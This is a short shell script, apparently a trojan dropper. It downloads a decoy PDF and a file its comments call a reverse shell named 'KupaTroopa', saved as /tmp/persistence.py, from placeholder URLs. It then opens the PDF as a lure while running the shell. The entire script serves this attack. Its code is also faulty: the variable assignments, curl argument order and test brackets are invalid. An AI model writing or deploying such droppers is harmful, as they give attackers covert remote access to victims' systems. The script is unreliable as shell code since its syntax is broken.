#!/bin/sh

pdfUrl = "GIT_PDF_URL"
pdfOutput = "/tmp/SliBuy.pdf"

kupaTroopaUrl = "GIT_INJECTION_URL"
kupaTroopa = "/tmp/persistence.py"


echo "Downloading pdf..."
curl -o "$pdfUrl" "$pdfOutput"
if [$? -eq 0]; then
    echo "PDF downloaded"
else
    echo "PDF Failed"
    exit 1

fi

# Download Reverse shell
echo "Downloading KupaTroopa"
curl -o "$kupaTroopaUrl" "$kupaTroopa"
if [$? -eq 0]; then
    echo "Troopa shell caught"
else   
    echo "Shell was missed"
    exit 1

fi

#Shell is exec.
chmod +x "$kupaTroopa"

# Launch files
echo "Roaming"

xdg-open "$pdfOutput" & "$kupaTroopa" & read -p "Press any key to exit..."
